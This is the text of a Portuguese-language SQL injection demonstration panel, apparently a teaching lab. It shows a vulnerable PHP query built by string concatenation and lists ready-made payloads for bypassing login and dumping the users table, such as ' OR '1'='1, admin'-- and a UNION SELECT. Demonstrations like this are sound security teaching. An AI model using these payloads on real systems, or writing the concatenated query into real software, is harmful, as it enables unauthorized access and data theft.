Painel — SQL Injection

Query SQL gerada pelo servidor

SELECT * FROM users WHERE username = '' AND password = ''
Aguardando entrada...
Como funciona

O servidor monta a query concatenando diretamente o input do usuário na string SQL.

Código vulnerável (PHP):
"SELECT * FROM users WHERE username='$user' AND password='$pass'"

Insira caracteres como ' ou -- para manipular a lógica da query.

Payloads prontos — clique para usar

' OR '1'='1
Torna a condição sempre verdadeira → retorna todos os usuários
admin'--
Comenta a verificação de senha → loga como admin sem senha
' OR 1=1--
Variante numérica — bypassa autenticação por completo
' UNION SELECT ... FROM users--
UNION attack — extrai todos os dados da tabela
